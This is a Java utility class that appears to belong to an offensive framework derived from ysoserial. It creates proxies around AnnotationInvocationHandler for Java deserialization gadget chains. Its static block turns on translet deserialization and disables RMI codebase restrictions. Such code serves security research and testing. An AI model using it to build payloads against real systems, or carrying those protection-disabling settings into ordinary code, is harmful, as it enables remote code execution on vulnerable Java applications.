package com.lucifaer.jokerframework.sdk.util.yso.util;

import java.lang.reflect.Array;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/**
 * @author Lucifaer
 * @version 3.0
 */
public class Gadgets {
    static {
        System.setProperty(DESERIALIZE_TRANSLET, "true");
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }
    public Gadgets() {
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoitizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoitizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<>();
        map.put(key, val);
        return map;
    }
}
